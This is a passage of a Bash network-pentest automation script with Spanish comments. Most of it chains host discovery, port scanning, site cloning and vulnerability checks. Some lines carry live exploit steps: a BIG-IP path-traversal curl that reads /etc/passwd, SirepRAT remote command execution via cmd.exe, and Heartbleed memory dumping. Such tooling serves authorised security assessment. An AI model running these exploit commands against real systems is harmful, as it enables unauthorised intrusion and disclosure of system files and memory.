    ###################################		


    #######  grafana  ######
    egrep -qi "Grafana" .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 		
        echo -e "\t\t[+] Revisando vulnerabilidades de Grafana($host)"
        
        $proxychains grafana.py -H $host -p $port  > logs/vulnerabilidades/"$host"_"$port"_grafana.txt 2>/dev/null
        egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$host"_"$port"_grafana.txt > .vulnerabilidades/"$host"_"$port"_grafana.txt
        
    fi
    ###################################	



    #######  joomla  ######
    grep -qi joomla .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 										
        echo -e "\t\t[+] Revisando vulnerabilidades de joomla ($host)"
        $proxychains joomscan.sh -u "$proto"://$host/ | sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > .vulnerabilidades/"$host"_"$port"_joomscan.txt &
        
        $proxychains JoomlaJCKeditor.py --url "$proto://$host" > .vulnerabilidades/"$host"_"$port"_JoomlaJCKeditor.txt
    fi
    ###################################	

    #######  WAMPSERVER  ######
    grep -qi WAMPSERVER .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 										
        echo -e "\t\t[+] Enumerando WAMPSERVER ($host)"
        $proxychains wampServer.pl -url "$proto"://$host/ > .enumeracion/"$host"_"$port"_WAMPSERVER.txt &
    fi
    ###################################	


    #######  BIG-IP F5  ######
    grep -qi "BIG-IP" .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 		
        echo -e "\t\t[+] Revisando vulnerabilidades de BIG-IP F5  ($host)"        
        $proxychains curl --path-as-is -s -k "$proto://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" > logs/vulnerabilidades/"$host"_"$port"_bigIPVul.txt
        egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port"_bigIPVul.txt > .vulnerabilidades/"$host"_"$port"_bigIPVul.txt
        
    fi
    ###################################

    #######  Cisco (ip) ######
    grep -qi ciscoASA .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 		
        echo -e "\t\t[+] Revisando vulnerabilidades de Cisco ASA/ Firepower ($host)"        
        $proxychains firepower.pl -host $host -port $port  > logs/vulnerabilidades/"$host"_"$port"_firepower.txt
        egrep --color=never "INTERNAL_PASSWORD_ENABLED" logs/vulnerabilidades/"$host"_"$port"_firepower.txt > .vulnerabilidades/"$host"_"$port"_firepower.txt
        
    fi
	
}


function testSSL ()
{
   proto=$1
   host=$2
   port=$3 

    echo -e "\t\t[+] TEST SSL ($proto : $host : $port)"	
    #######  hearbleed ######						
    echo -e "\t\t[+] Revisando vulnerabilidad heartbleed"
    echo "$proxychains  nmap -n -sT -Pn -p $port --script=ssl-heartbleed $host" > logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt 2>/dev/null 
    $proxychains nmap -n -sT -Pn -p $port --script=ssl-heartbleed $host >> logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt 2>/dev/null 
    egrep -qi "VULNERABLE" logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt
    greprc=$?
    if [[ $greprc -eq 0 ]] ; then						
        echo -e "\t\t$OKRED[!] Vulnerable a heartbleed \n $RESET"
        grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$host"_"$port"_heartbleed.txt				
        $proxychains heartbleed.py $host -p $port 2>/dev/null | head -100 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' > .vulnerabilidades/"$host"_"$port"_heartbleedRAM.txt
        $proxychains heartbleed.sh $host $port &
    else							
        echo -e "\t\t$OKGREEN[i] No vulnerable a heartbleed $RESET"
    fi
    ##########################
    
    
    #######  Configuracion TLS/SSL (dominio) ######	
	if [ "$MODE" == "assessment"  ]; then 
		echo -e "\t\t[+] Revisando configuracion TLS/SSL"		
		testssl.sh --color 0  "https://$host:$port" > logs/vulnerabilidades/"$host"_"$port"_confTLS.txt 2>/dev/null 
		grep --color=never "incorrecta" logs/vulnerabilidades/"$host"_"$port"_confTLS.txt | egrep -iv "Vulnerable a" > .vulnerabilidades/"$host"_"$port"_confTLS.txt
		grep --color=never "VULNERABLE (actualizar)" logs/vulnerabilidades/"$host"_"$port"_confTLS.txt > .vulnerabilidades/"$host"_"$port"_vulTLS.txt
		grep --color=never "VULNERABLE (actualizar)" -m1 -b0 -A9 logs/vulnerabilidades/"$host"_"$port"_confTLS.txt > logs/vulnerabilidades/"$host"_"$port"_vulTLS.txt							     
	fi					
    
    ##########################    

}

function enumeracionIOT ()
{
   proto=$1
   host=$2
   port=$3  
   echo -e "\t\t[+]Params $proto : $host : $port "
	egrep -iq "Windows Device Portal" .enumeracion/"$host"_"$port"_webData.txt 
	greprc=$?
	if [[ $greprc -eq 0 && ! -f .enumeracion/"$host"_"$port"_webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
		echo -e "\t\t[+] Revisando SirepRAT ($host)"
		$proxychains SirepRAT.sh $host LaunchCommandWithOutput --return_output --cmd 'c:\windows\System32\cmd.exe' --args '/c ipconfig' --v >> logs/vulnerabilidades/"$host"_"$port"_SirepRAT.txt
		grep -ia 'IPv4' logs/vulnerabilidades/"$host"_"$port"_SirepRAT.txt > .vulnerabilidades/"$host"_"$port"_SirepRAT.txt

	fi

					
	#######  DLINK backdoor ######
	
	respuesta=`grep -i alphanetworks .enumeracion/"$host"_"$port"_webData.txt`
	greprc=$?
	if [[ $greprc -eq 0 ]];then 		
		echo -e "\t\t$OKRED[!] DLINK Vulnerable detectado \n $RESET"						
		echo -n "[DLINK] $respuesta" >> .vulnerabilidades/"$host"_"$port"_backdoorFabrica.txt 
		
	fi
	###########################		
}        


function cloneSite ()
{
   proto=$1
   host=$2
   port=$3  
   echo -e "\t\t[+] Clone site ($proto : $host : $port)"	

    #######  clone site  ####### 									
    cd webClone
        echo -e "\t\t[+] Clonando sitio ($host) tardara un rato"	
        wget -mirror --convert-links --adjust-extension --no-parent -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp,ttf,svg,woff2,css,ico --exclude-directories /calendar,/noticias,/blog,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate $proto://$host 2>/dev/null
        rm index.html.orig 2>/dev/null

        echo ""
        echo -e "\t\t[+] Extrayendo URL de los sitios clonados"	
        grep --color=never -irao "http://[^ ]*"  * 2>/dev/null| cut -d ":" -f3 | grep --color=never -ia "$DOMINIO_EXTERNO" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > http.txt 				     
        lines=`wc -l http.txt  | cut -d " " -f1`
        perl -E "say \"http://\n\" x $lines" > prefijo.txt # file with the domain (n times)
        paste -d '' prefijo.txt http.txt >> ../logs/enumeracion/"$DOMINIO_EXTERNO"_web_wget2.txt # adicionar http:// a cada linea
        rm http.txt 2>/dev/null

        grep --color=never -irao "https://[^ ]*"  * 2>/dev/null | cut -d ":" -f3 | grep --color=never -ia "$DOMINIO_EXTERNO" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > https.txt 
        lines=`wc -l https.txt  | cut -d " " -f1`
        perl -E "say \"https://\n\" x $lines" > prefijo.txt # file with the domain (n times)
        paste -d '' prefijo.txt https.txt >> ../logs/enumeracion/"$DOMINIO_EXTERNO"_web_wget2.txt  # adicionar https:// a cada linea
        rm https.txt 2>/dev/null

                    
        echo -e "\t\t[+] Buscando archivos sin extension"
        find . -type f ! \( -iname \*.pdf -o -iname \*.html -o -iname \*.htm -o -iname \*.doc -o -iname \*.docx -o -iname \*.xls -o -iname \*.ppt -o -iname \*.pptx -o -iname \*.xlsx -o -iname \*.js -o -iname \*.PNG  -o -iname \*.txt  -o -iname \*.css  -o -iname \*.php -o -iname \*.orig \) > archivos-sin-extension.txt
        contador=1
        mkdir documentos_renombrados 2>/dev/null
        for archivo in `cat archivos-sin-extension.txt`;
        do 		
            tipo_archivo=`file $archivo`
            # tipos de archivos : https://docs.microsoft.com/en-us/previous-versions//cc179224(v=technet.10)
            if [[ ${tipo_archivo} == *"PDF"*  ]];then 
                mv $archivo documentos_renombrados/$contador.pdf 
            fi		
        
            if [[ ${tipo_archivo} == *"Creating Application: Microsoft Word"*  ]];then 												
                mv $archivo documentos_renombrados/$contador.doc 
            fi		
            
            if [[ ${tipo_archivo} == *"Microsoft Word 2007"*  ]];then 												
                mv $archivo documentos_renombrados/$contador.docx 
            fi		
        
            if [[ ${tipo_archivo} == *"Creating Application: Microsoft Excel"*  ]];then 				
                mv $archivo documentos_renombrados/$contador.xls 
            fi				 
        
            if [[ ${tipo_archivo} == *"Office Excel 2007"*  ]];then 							
                mv $archivo documentos_renombrados/$contador.xlsx 
            fi
                
            if [[ ${tipo_archivo} == *"Creating Application: Microsoft PowerPoint"*  ]];then 								
                mv $archivo documentos_renombrados/$contador.ppt 
            fi	
                
            if [[ ${tipo_archivo} == *"Office PowerPoint 2007"*  ]];then 				
                mv $archivo documentos_renombrados/$contador.pptx 
            fi		
        
            if [[ ${tipo_archivo} == *"RAR archive data"*  ]];then 						
                mv $archivo documentos_renombrados/$contador.rar 
            fi		
            let "contador=contador+1"	 
        done # fin revisar archivos sin extension
        
        #### mover archivos con metadata para extraerlos ########
        echo -e "\t\t[+] Extraer metadatos con exiftool"										
        find . -name "*.pdf" -exec mv {} "../archivos" \;
        find . -name "*.xls" -exec mv {} "../archivos" \;
        find . -name "*.doc" -exec mv {} "../archivos" \;
        find . -name "*.ppt" -exec mv {} "../archivos" \;
        find . -name "*.pps" -exec mv {} "../archivos" \;
        find . -name "*.docx" -exec mv {} "../archivos" \;
        find . -name "*.pptx" -exec mv {} "../archivos" \;
        find . -name "*.xlsx" -exec mv {} "../archivos" \;
        
		if [ $internet == "s" ]; then 	#escluir CDN 
			######### buscar IPs privadas
			echo -e "\t\t[+] Revisando si hay divulgación de IPs privadas"	
			grep -ira "192.168." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO_EXTERNO"_web_IPinterna.txt
			grep -ira "172.16." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO_EXTERNO"_web_IPinterna.txt
									
			grep -ira "http://172." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO_EXTERNO"_web_IPinterna.txt
			grep -ira "http://10." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO_EXTERNO"_web_IPinterna.txt
			grep -ira "http://192." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO_EXTERNO"_web_IPinterna.txt

			grep -ira "https://172" * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO_EXTERNO"_web_IPinterna.txt
			grep -ira "https://10." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO_EXTERNO"_web_IPinterna.txt
			grep -ira "https://192." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO_EXTERNO"_web_IPinterna.txt
			###############################	
		fi
        
        ######### buscar links de amazon EC2
        grep --color=never -ir 'amazonaws.com' * >> ../.enumeracion/"$DOMINIO_EXTERNO"_web_amazon.txt
        
        ######### buscar comentarios 
        echo -e "\t\t[+] Revisando si hay comentarios html, JS"	
        grep --color=never -ir '// ' * | egrep -v "http|https|header|footer|div|class" >> ../.enumeracion/"$DOMINIO_EXTERNO"_web_comentario.txt
        grep --color=never -r '<!-- ' * | egrep -v "header|footer|div|class" >> ../.enumeracion/"$DOMINIO_EXTERNO"_web_comentario.txt
        grep --color=never -r ' \-\->' * | egrep -v "header|footer|div|class" >> ../.enumeracion/"$DOMINIO_EXTERNO"_web_comentario.txt
        #egrep -i " password | contrase| pin | firma| key | api " ../.enumeracion/"$DOMINIO_EXTERNO"_web_comentario.txt | egrep -v "shift key|Key event|return key|key and mouse|bind key" > ../.vulnerabilidades/"$DOMINIO_EXTERNO"_web_comentario.txt
        ###############################	
    cd ../
}



echo -e "\n\n$OKYELLOW ########### Configurando los parametros ############## $RESET"

if [ ! -d "servicios" ]; then #si no existe la carpeta servicios es un nuevo escaneo

  echo -e "$OKBLUE ¿Desde que VLAN estas ejecutando? $RESET"
  read project

  mkdir $project
  cd $project
  prefijo="../"


	mkdir .arp
	mkdir .escaneos
	mkdir .datos
	mkdir .escaneo_puertos	
	mkdir .escaneo_puertos_banners
	mkdir .enumeracion
	mkdir .enumeracion2 
	mkdir .banners
	mkdir .banners2
	mkdir .vulnerabilidades	
	mkdir .vulnerabilidades2 	
	mkdir reportes
	mkdir archivos
	mkdir webClone
	mkdir responder
	mkdir metasploit
	mkdir credenciales
	mkdir servicios
	mkdir .tmp
	mkdir -p logs/cracking
	mkdir -p logs/enumeracion
	mkdir -p logs/vulnerabilidades
	
	cp /usr/share/lanscanner/.resultados.db .
fi

touch $smb_list 
touch $smbclient_list
touch $mass_scan_list 
touch $ping_list
touch webClone/checksumsEscaneados.txt


#echo -e "$OKBLUE Que interfaz usaremos? $iface,tap0, etc ?$RESET"
#read 
ifaces=`ip addr | grep -iv DOWN | awk '/UP/ {print $2}' | egrep -v "lo|dummy|rmnet|vmnet|eth1" | sed 's/.$//'`
#Si usamos VPN
if [[ $ifaces == *"tun0"* ]]; then
	echo "Se detecto el uso de VPN"
	iface="tun0"
	VPN="1"
else
	iface=`echo $ifaces| head -1`
	VPN="0"

fi

echo -e "$OKBLUE Usando la interfaz $iface $RESET"

#### Obtener datos del escaneo ###
my_ip=`ifconfig $iface | grep -i mask | awk '{print $2}' | sed 's/addr://g'`
my_mac=`ifconfig $iface | grep ether | awk '{print $2}'`
my_mask=`ifconfig $iface | grep mask | awk '{print $4}'`
my_route=`route -n | grep UG | awk '{print $2}'`
date=`date`
current_subnet=`ifconfig $iface | grep -i mask | awk '{print $2}' | cut -d . -f 1-3`
dns=`grep --color=never nameserver /etc/resolv.conf`

if [ -z "$my_mac" ]
then
      my_mac=`ifconfig $iface | grep HWaddr | awk '{print $5}'`
fi
###########

echo -e "Datos del escaneo:" | tee -a reportes/info.txt
echo -e "\t IP Origen: $my_ip " | tee -a reportes/info.txt
echo -e "\t MAC : $my_mac" | tee -a reportes/info.txt
echo -e "\t Gateway: $my_route " | tee -a reportes/info.txt
echo -e "\t DNS: $dns " | tee -a reportes/info.txt
echo -e "\t Mask: $my_mask" | tee -a reportes/info.txt
echo -e "\t Date: $date  \n" | tee -a reportes/info.txt
  
# FASE: 1
#######################################  Discover live hosts ##################################### 

# Using ip list   
if [ $IP_LIST_FILE != NULL ] ; then  
	#Lista de IPs como parametro (generalmente IPs publicas/subdominios) separadas por ,
     echo -e  "[+] Usando  archivo : $prefijo$IP_LIST_FILE " 
	 pwd
     if [ ! -f $prefijo$IP_LIST_FILE ]; then
		echo -e  "$OKRED El archivo no existe ! $RESET"
		exit
	 fi
     
     cat $prefijo$IP_LIST_FILE | cut -d "," -f 3 | sort | uniq > $live_hosts        
fi

if [[ ("$START" != 'enumeration'  ) && ($IP_LIST_FILE == NULL)]];then 
  
  echo -e "[+] Buscar host vivos en otras redes usando ICMP,SMB,TCP21,22,80,443 \n" 
  echo -e "$OKYELLOW [+] FASE 1: DESCUBRIR HOST VIVOS $RESET"

  ######## ARP ########  
  echo -e "$OKBLUE ¿Realizaremos escaneo ARP para tu red local? s/n  $RESET"
  read scanARP

  if [ $scanARP == 's' ]; then
   
  	echo -e "[+] Obteniendo host vivos locales"
	arp-scan $iface $my_ip/24  | tee -a .arp/$current_subnet.0.arp2 2>/dev/null
	sleep 1
	arp-scan $iface $my_ip/24  | tee -a .arp/$current_subnet.0.arp2 2>/dev/null  
	
	sort .arp/$current_subnet.0.arp2 | sort | uniq > .arp/$current_subnet.0.arp
	rm .arp/$current_subnet.0.arp2
	echo -e "\t \n"
  
	# ARP
	for listaIP in $(ls .arp | egrep -v "all|done"); do      	
		cat .arp/$listaIP | egrep -v "DUP|packets" | grep ^1 | awk '{print $1}' | sort >> $arp_list
		mv .arp/$listaIP .arp/$listaIP.done	
	done;
  fi

  #######################  
  
   	  
	echo -e "$OKBLUE Realizar escaneo de puertos 22,80,443 en busca de mas hosts vivos ? s/n $RESET"	  
	read adminports
	  
	echo -e "$OKBLUE Realizar escaneo ICMP (ping) en busca de mas hosts vivos ? (Mas lento aun ...) s/n $RESET"	  
	read pingscan	 
 	 
	  	  	 	
	  #################################   SMB    ####################
	  echo -e "##### Realizando escaneo SMB en busca de mas hosts vivos #####"	  
	  
	  if [ $SUBNET_FILE != NULL ] ; then	  	 
		for subnet in `cat $prefijo$SUBNET_FILE`;
		do 
			echo -e "\t[+] Escaneando: $subnet "
			subnet_name=`echo $subnet| cut -d '/' -f1`
			nbtscan $subnet | tee -a logs/enumeracion/"$subnet_name"_smb_scan.txt
			grep --color=never ">" logs/enumeracion/"$subnet_name"_smb_scan.txt > .enumeracion/"$subnet_name"_smb_scan.txt
			
		done
	  fi	
	  cat logs/enumeracion/"$subnet_name"_smb_scan.txt | grep : | awk '{print $1}' | grep --color=never ^1 > $smb_list 2>/dev/null	  
      
                                   
      echo -e  " #######################################################" 
      echo -e  "$OKYELLOW Con el escaneo SMB  encontramos estos hosts vivos: $RESET" 
      cat $smb_list
      echo -e "\t"      
      #######################################
      
      
      #################################   DNS    ####################
	  if [ $SUBNET_FILE != NULL ] ; then	
			echo -e "$OKBLUE ##### Realizando escaneo DNS reverso ##### $RESET"	  
			
			if [ $SUBNET_FILE != NULL ] ; then	  	 
				for subnet in `cat $prefijo$SUBNET_FILE`;
				do 
					echo -e "[+] Escaneando: $subnet "	
					subnet_name=`echo $subnet| cut -d '/' -f1`
					dnsrecon -r $subnet -d $DOMINIO_EXTERNO | tee -a logs/enumeracion/"$subnet_name"_dns_reverse.txt
					grep --color=never "PTR" logs/enumeracion/"$subnet_name"_dns_reverse.txt > .enumeracion/"$subnet_name"_dns_reverse.txt
					grep PTR logs/enumeracion/"$subnet_name"_dns_reverse.txt | awk '{print $4}' >> $dns_list
				done
			fi

		echo -e  " #######################################################" 
		echo -e  "$OKRED Encontramos estos hosts vivos: $RESET" 
		cat $dns_list
		echo -e "\t"    

	  fi
	  
	  
           
      
      #################################   PORT 23,80,443,22  escaneando ##################
	  
	  if [ $adminports == 's' ]
      then 
		echo -e "$OKBLUE ##### Realizando escaneo al puerto 22,80,443 en busca de mas hosts vivos ##### $RESET"	  
      
		if [ $SUBNET_FILE != NULL ] ; then	  	 
			for subnet in `cat $prefijo$SUBNET_FILE`;
			do 
				echo -e "\t[+] Escaneando: $subnet "
				masscan --interface $iface -p21,22,23,80,443,445,3389 --rate=150 $subnet | tee -a .escaneos/mass-scan.txt
			done		
		fi
	               
		
		cat .escaneos/mass-scan.txt | cut -d " " -f 6 | sort | uniq | grep --color=never ^1 > $mass_scan_list 2>/dev/null

		echo -e  " #######################################################" 
		echo -e  "$OKRED Encontramos estos hosts vivos: $RESET" 
		cat $mass_scan_list
		echo -e "\t"             
      fi  	  	  
      
      #######################################
	  
	  
	  
	   #################################   ICMP escaneando   ####################
	  
	  if [ $pingscan == 's' ]
      then 
		echo -e "$OKBLUE ##### Realizando escaneo ping en busca de mas hosts vivos ##### $RESET"	  
		
		if [ $SUBNET_FILE != NULL ] ; then	  	 
			for subnet in `cat $prefijo$SUBNET_FILE`;
			do 
				echo -e "[+] Escaneando: $subnet "
				fping -a -g $subnet 2>/dev/null | tee -a .escaneos/escaneo-ping.txt 
				sleep 1
			done

			for subnet in `cat $prefijo$SUBNET_FILE`;
			do 
				echo -e "[+] Escaneando: $subnet (ronda 2)"
				fping -a -g $subnet 2>/dev/null | tee -a .escaneos/escaneo-ping.txt 
				sleep 1
			done
		fi
		
        
        cat .escaneos/escaneo-ping.txt | grep -v Escaneando  | sort | sort | uniq | grep --color=never ^1 > $ping_list 2>/dev/null
        
        echo -e  " #######################################################" 
        echo -e  "$OKYELLOW Con el escaneo ICMP (ping) encontramos estos hosts vivos: $RESET" 
        cat $ping_list
        echo -e "\t"       
      fi        
	  #######################################
	           
    #fi #if scan_type
      #################################   smbclient   ####################
	  
	   ####### smbclient scan #
    #echo -e "$OKBLUE ¿Realizaremos escaneo con smbclient para descubrir mas host? s/n (Recomendado para LAN) $RESET"
	#read smbclient
	smbclient="n"

    if [ $smbclient == 's' ]
   then     
		
		echo -e "##### Realizando escaneo smclient en busca de mas hosts vivos #####"	  
		
		######## preliminar join arp + ping +smb + mass scan + DNS to review more hosts
		cat $dns_list $smb_list $mass_scan_list $ping_list $arp_list 2>/dev/null | sort | sort | uniq > $live_hosts #2>/dev/null 
		sed -i '/^\s*$/d' $live_hosts # delete empty lines	          
		##################  
     
		for ip in `cat $live_hosts`;			
		do 		
			smbclient -L $ip -U "%"  | egrep -vi "comment|---|master|Error|reconnecting|failed" | awk '{print $1}' >> .escaneos/smbclient.txt 2>/dev/null
		done
		cat .escaneos/smbclient.txt | sort | uniq | sort > .escaneos/smbclient2.txt

		for hostname in `cat .escaneos/smbclient2.txt`;
		do 			
			host $hostname | grep "has address" | cut -d " " -f 4 >> $smbclient_list
		done
				
        
        echo -e  " #######################################################" 
        echo -e  "$OKYELLOW Con el escaneo de smbclient encontramos estos hosts vivos: $RESET" 
        cat $smbclient_list
        echo -e "\t"             
	  ####################################### 
	
   fi   
	##################
	

    
    echo -e  " #######################################################" 
    ############ Generando lista ###########
   
    
     ######## Final join arp + ping +smb + mass scan + DNS + smbclient
	 cat $dns_list $smb_list $mass_scan_list $ping_list $arp_list $smbclient_list 2>/dev/null | sort | sort | uniq > $live_hosts #2>/dev/null 
	 sed -i '/^\s*$/d' $live_hosts # delete empty lines	          
     ##################                 	      
	  
	  echo -e  " #######################################################" 
      echo -e  "[i] TOTAL HOST VIVOS ENCONTRADOS:" 
      echo -e "\t"                  
fi # if NO IP FILE
 


 # generate subnets 
cat $live_hosts | cut -d . -f 1-3 | sort | uniq > .datos/subnets.txt
echo -e "[+] Lanzando monitor $RESET" 
xterm -hold -e monitor.sh $live_hosts 2>/dev/null &

###### #check host number########
total_hosts=`wc -l .datos/total-host-vivos.txt | sed 's/.datos\/total-host-vivos.txt//g'| tr -d ' ' `
echo -e  "TOTAL HOST VIVOS ENCONTRADOS: ($total_hosts) hosts" 

grep -iq cpcontacts $prefijo$IP_LIST_FILE  2>/dev/null
greprc=$?
if [[ $greprc -eq 0 ]] ; then
	hosting='s'
else
	hosting='n'	
fi
echo -e "[+] hosting = $hosting (using... $prefijo$IP_LIST_FILE )"	  
#cat $live_hosts
if [[ "$internet" == NULL  ]]; then 	
	if [[ -f "logs/enumeracion/subdominios.txt" ]]; then			
		echo -e "[+] Se detecto que estamos escaneando IPs públicas."	  
		internet="s"		
		VECTOR="EXTERNO"
	else
		echo -e "[+] Se detecto que estamos escaneando IPs privadas."	  
		internet="n"
		VECTOR="INTERNO"
		
		if [[  "$START" != 'enumeration' ]]; then					
			if [ $iface == 'tun0' ]; then			
				echo "Conexion VPN detectada (Offsec)"
			else
				echo -e "[+] Adiciona/quita IPs y presiona ENTER" 
				sleep 3
				gedit .datos/total-host-vivos.txt & 2>/dev/null
				read resp
			fi 	
		fi	#enumeration	
	fi  #set internet
fi #

################## end discover live hosts ##################

if [[ "$START" != 'enumeration'  ]];then 

	echo -e "$OKYELLOW [+] FASE 2: ESCANEO DE PUERTOS,VoIP, etc $RESET"
	################## Escanear (voip,smb,ports,etc) ##################

	########### searching VoIP devices ##########
	echo -e "############# Escaneando #################\n"
		if [ "$PROXYCHAINS" == "n" ]; then 
			echo -e "#################### Buscando dispositivos VoIP: ######################"	  
			for subnet in $(cat .datos/subnets.txt); do
				echo -e "[+] Escaneando $subnet.0/24 (VoIP)"	  
				svmap $subnet".0/24" | tee -a logs/enumeracion/"$subnet".0_voip_scan.txt		
				

				egrep -iq ":" logs/enumeracion/"$subnet".0_voip_scan.txt	
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then
					cat logs/enumeracion/"$subnet".0_voip_scan.txt	 > .enumeracion/"$subnet".0_voip_scan.txt
					grep --color=never ":" logs/enumeracion/"$subnet".0_voip_scan.txt	 | cut -d " " -f2 > servicios/voip.txt	
				fi				
			done;	
			#find  .enumeracion -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
		fi  
	
		
	#####################
	
	
	
	echo -e "#################### Escaneo de puertos TCP ######################"	  
	#nmap_masscan = nmap top 1000 + masscan (10.000 puertos) 
	#nmap_naabu = nmap top 1000 + naabu (Todos puertos)

	## NAABU
	if [[ $PORT_SCANNER = "naabu" ]] || [ $PORT_SCANNER == "nmap_naabu" ] || [ $PORT_SCANNER == "masscan_naabu" ]; then 
		echo "USANDO NAABU COMO PORT SCANNER"
		pwd
		echo -e "[+] Realizando escaneo tcp (Todos los puertos)" 
		#naabu -list $live_hosts -top-ports 100 -c 5 -o .escaneo_puertos/tcp-1000.txt
		if [ $internet == "s" ]; then 	#escluir CDN 
			docker run -v `pwd`:/tmp -it projectdiscovery/naabu -list /tmp/$live_hosts -exclude-cdn -c 5 -rate 100 -o .escaneo_puertos/tcp-ports.txt
		else		
			docker run -v `pwd`:/tmp -it projectdiscovery/naabu -list /tmp/$live_hosts -p 1-10514  -c 5 -rate 100 -o .escaneo_puertos/tcp-ports.txt
		fi
	fi

	#NMAP
	if [[ $PORT_SCANNER = "nmap" ]] || [ $PORT_SCANNER == "nmap_masscan" ] || [ $PORT_SCANNER == "nmap_naabu" ]; then 
		echo "USANDO NMAP COMO PORT SCANNER" 

		if [ "$MODE" == "proxy" ]; then 
			echo -e "[+] Realizando escaneo tcp (solo 100 puertos - proxy)" 			
			
			for ip in $(cat $live_hosts); do  			
				while true; do				
					nmap_instances=$((`ps aux | grep nmap | wc -l` - 1)) 			
					if [[ $nmap_instances -lt $max_nmap_instances  ]];then 										
						echo -e "[+] Escaneando $ip"	
						
						proxychains nmap -sT -Pn -T4 --top-ports 100 -n --open  --host-timeout 600  --min-parallelism 100 --min-rate 1 $ip -oG .escaneo_puertos/$ip.proxy-nmap &
						sleep 0.1;
						break												
					else				
						nmap_instances=$((`ps aux | grep nmap | wc -l` - 1)) 
						echo -e "\t[-] Maximo número de instancias de nmap ($nmap_instances)"
						sleep 3									
					fi		
				done # while true		
			done # for
				
			######## wait to finish web info ########
			while true; do
				nmap_instances=$((`ps aux | grep nmap | grep -v lanscanner.sh | wc -l` - 1)) 			
				if [ "$nmap_instances" -gt 0 ]
				then
					echo -e "\t[i] Todavia hay escaneos de nmap activos ($nmap_instances)"  
					sleep 30
				else
					break		  		 
				fi				
			done
			###########################################################
			cat .escaneo_puertos/$ip.proxy-nmap >> .escaneo_puertos/tcp-100-nmap.grep
			egrep -v "^#|Status: Up" .escaneo_puertos/tcp-100-nmap.grep | cut -d' ' -f2,4- | sed -n -e 's/Ignored.*//p'  | awk '{for(i=2; i<=NF; i++) { a=a" "$i; }; split(a,s,","); for(e in s) { split(s[e],v,"/"); printf "%s:%s\n" , $1, v[1]}; a="" }' | sed 's/ //g'  >>  .escaneo_puertos/tcp-ports.txt

		else
			echo -e "[+] Realizando escaneo de puertos especificos (informix, Web services)"  			
			nmap -iL  $live_hosts -Pn -p 11211,1433,1521,1525,1526,1530,17001,27017,3269,32764,37777,464,47001,49664,49665,49666,49667,49669,49676,49677,49684,49706,49915,5432,593,5985,5986,6379,81,82,8291,83,84,85,8728,24007,49152,44134,50030,50060,50070,50075,50090 -oG .escaneo_puertos/tcp-especificos-nmap.grep	 
			# parsear salida nmap  --> 200.87.68.149:443 
			nmap-grep.sh .escaneo_puertos/tcp-especificos-nmap.grep  >> .escaneo_puertos/tcp-especificos.txt
				
			echo -e "[+] Realizando escaneo tcp (solo 1000 puertos)" 			
			nmap -Pn -n -iL  $live_hosts --min-parallelism 100  -oG .escaneo_puertos/tcp-1000-nmap.grep
			#egrep -v "^#|Status: Up" .escaneo_puertos/tcp-1000-nmap.grep | cut -d' ' -f2,4- | sed -n -e 's/Ignored.*//p'  | awk '{for(i=2; i<=NF; i++) { a=a" "$i; }; split(a,s,","); for(e in s) { split(s[e],v,"/"); printf "%s:%s\n" , $1, v[1]}; a="" }' | sed 's/ //g'  >>  .escaneo_puertos/tcp-ports.txt
			nmap-grep.sh .escaneo_puertos/tcp-1000-nmap.grep >> .escaneo_puertos/tcp-ports.txt
		fi
			
	fi


	## MASSCAN
	if [[ $PORT_SCANNER = "masscan" ]] || [ $PORT_SCANNER == "nmap_masscan" ] || [ $PORT_SCANNER == "masscan_naabu" ]; then 
		if [ "$PROXYCHAINS" == "n" ]; then 
			echo "USANDO MASSCAN COMO PORT SCANNER"		    
			
			if [[ $total_hosts -lt 25 || $internet == "s"  ]];then 
				echo -e "[+] Realizando escaneo tcp(p1-10514)  $total_hosts hosts" 	
				masscan --interface $iface -p1-10514 --rate=50 -iL  $live_hosts | tee -a .escaneo_puertos/mass-scan.txt
			else
		
				echo -e "[+] Realizando escaneo tcp(puertos especificos)  $total_hosts hosts" 	
